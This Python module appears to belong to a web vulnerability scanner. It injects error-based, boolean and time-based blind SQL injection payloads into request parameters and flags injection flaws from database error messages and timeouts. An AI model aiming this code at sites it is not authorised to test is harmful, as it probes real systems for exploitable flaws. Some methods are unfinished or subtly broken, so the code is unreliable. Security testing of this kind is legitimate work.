from os.path import join as path_join
import sys 
import requests
import src.attack_utils as autil

# from src.http_executor import ExecutePUTbyRequest
from src.web_input import WebInput
from configparser import ConfigParser
from bs4 import BeautifulSoup as bs
import random

from random import randint
from data.dbmsErrors import DBMS_ERROR_PATTERNS
from src.attack_utils import Flags
from src.attack_utils import PayloadReader
from httpx import ReadTimeout, RequestError
import time 

PAYLOADS_FILE = path_join("../fuzz/data", "blindSQLPayloads.txt")

def generate_boolean_payloads():
    payloads = []
    for use_parenthesis in (False, True):
        for separator in ("", "'", "\""):
            for payload in generate_boolean_test_values(separator, use_parenthesis):
                payloads.append(payload)
    return payloads


def generate_boolean_test_values(separator: str, parenthesis: bool):
    fmt_string = (
        "[VALUE]{sep} AND {left_value}={right_value} AND {sep}{padding_value}{sep}={sep}{padding_value}",
        "[VALUE]{sep}) AND {left_value}={right_value} AND ({sep}{padding_value}{sep}={sep}{padding_value}"
    )[parenthesis]

    for __ in range(2):
        value1 = randint(10, 99)
        value2 = randint(10, 99) + value1
        padding_value = randint(10, 99)

        # First two payloads give negative tests
        # Due to Mutator limitations we leverage some Flags attributes to put our indicators
        yield (
            fmt_string.format(left_value=value1, right_value=value2, padding_value=padding_value, sep=separator),
            Flags(section="False", platform=f"{'p' if parenthesis else ''}_{separator}")
        )

    for __ in range(2):
        value1 = randint(10, 99)
        padding_value = randint(10, 99)

        # Last two payloads give positive tests
        yield (
            fmt_string.format(left_value=value1, right_value=value1, padding_value=padding_value, sep=separator),
            Flags(section="True", platform=f"{'p' if parenthesis else ''}_{separator}")
        )

def _find_pattern_in_response(data):
    for dbms, regex_list in DBMS_ERROR_PATTERNS.items():
        for regex in regex_list:
            if regex.search(data):
                return f"SQL Injection (DBMS: {dbms})"

    # Can't guess the DBMS but may be useful
    if "Unclosed quotation mark after the character string" in data:
        return ".NET SQL Injection"
    if "StatementCallback; bad SQL grammar" in data:
        return "Spring JDBC Injection"

    if "XPathException" in data:
        return "XPath Injection"
    if "Warning: SimpleXMLElement::xpath():" in data:
        return "XPath Injection"
    if "supplied argument is not a valid ldap" in data or "javax.naming.NameNotFoundException" in data:
        return "LDAP Injection"

    return ""

class AttackSQLI():
    def __init__(self, target_pool, session, vul_logger, http_executor):
        self.target_pool = target_pool
        self.session = session
        self.vul_logger = vul_logger
        self.http_executor = http_executor

        self.payload = "[VALUE]\xBF'\"("
        payload_reader = PayloadReader()
        self.time_payload = payload_reader.read_payloads(PAYLOADS_FILE)
        #print(self.time_payload)

    def Run(self):
        print('SQL Injection Attack starts')
        vul_detected = False
        for target in self.target_pool.GetListSQLI():
            
            original_params = target.web_input.DecodeAsSessionParams()

            print("Attack Params:"+ str(original_params) + str(target.detected_idx))
            
            for target_index in target.detected_idx:
            
    
                # Error based SQL Injection
                attack_params = autil.injectPayload(original_params, self.payload, target_index)
                
                #print(attack_params)
                #print(valid_params)
                result_headers, result_response = self.http_executor.ExecutePUTbyRequest(self.target_pool.GetRootURL(), self.session,attack_params, target.method, target_index, self.vul_logger)
                valid_params = autil.injectPayload(original_params, "1234", target_index)
                # Check attack is successful
                vul_detection, vul_info = self.OracleSQLI(result_response, self.target_pool.GetRootURL(), valid_params, target.method)
                if vul_detection:
                    self.vul_logger.LogVul("SQLI", vul_info, self.target_pool.GetRootURL(), str(list(original_params)[target_index]), str(self.payload) + " " +  str (attack_params))
                    print("vulnerability detected: " + self.target_pool.GetRootURL() + str(attack_params))
                    self.target_pool.appendSQLI(target_index)
                    vul_detected = True
                    break

    def _is_false_positive(self, url, original_params, method):
        try:
            result_headers, result_response = self.http_executor.ExecutePUTbyRequest(url, self.session, original_params, method, -1 , self.vul_logger)
        except RequestError:
            self.network_errors += 1
        else:
            if _find_pattern_in_response(result_response):
                return True
        return False

    def OracleSQLI(self, response, url, original_params, method):
        vul_info = _find_pattern_in_response(response)
        # print(vul_info)
        if vul_info != "" and not self._is_false_positive(url, original_params, method):
            return True, vul_info

        return False, ""
    
    def OracleTimeSQLI():
        pass
    def Blind(self):
        
        vul_detected = False
        payloads = generate_boolean_payloads() 
        
        for target in self.target_pool.GetListBlind():
            
            original_params = target.web_input.DecodeAsSessionParams()
            # TODO: Send original request 
            try:
                good_headers, good_response = self.http_executor.ExecutePUTbyRequest(self.target_pool.GetRootURL(), self.session, original_params, target.method, -1, self.vul_logger)
                #good_status = good_response.status
                #good_redirect = good_response.redirection_url
                good_hash = text_only_md5(good_response)

            except ReadTimeout:
                pass 

            # print("Attack Params:"+ str(original_params) + str(target.detected_idx))
            test_results = []
            
            for target_index in target.detected_idx:
                if target_index not in self.target_pool.GetVulSQLi():
                    attack_success = False
                    current_parameter = None
                    skip_till_next_parameter = False
                    current_session = None
                    test_results = []
                    last_mutated_request = None
                    last_response = None
                    
                    if not attack_success:
                        # print("Time-based SQL Injection")
                        # try original request first
                        result_headers, result_response = self.http_executor.ExecutePUTbyRequest(self.target_pool.GetRootURL(), self.session,original_params, target.method, target_index,self.vul_logger)
                        if result_response == "Read timed out":
                            pass
                        else:
                            for (payload, flag) in self.time_payload:
                                attack_params =autil.injectPayload(original_params, payload, target_index) 
                                #print(attack_params)
                                result_headers, result_response = self.http_executor.ExecutePUTbyRequest(self.target_pool.GetRootURL(), self.session,attack_params, target.method, target_index,self.vul_logger)
                                if result_response == "Read timed out":
                                    result_headers, result_response = self.http_executor.ExecutePUTbyRequest(self.target_pool.GetRootURL(), self.session,attack_params, target.method, target_index,self.vul_logger)
                                    time.sleep(2)
                                    if result_response == "Read timed out":
                                        vul_info = "SQL Injection"
                                        self.vul_logger.LogVul("Blind-SQLI", vul_info, self.target_pool.GetRootURL(), str(list(original_params)[target_index]), str(payload) + " " +  str (attack_params))
                                        print("vulnerability detected time sqli: " + self.target_pool.GetRootURL() + str(attack_params))
                                        time.sleep(2)
                                        break
                            

from hashlib import md5
def text_only_md5(word):
    return md5(word.encode(errors="ignore")).hexdigest()

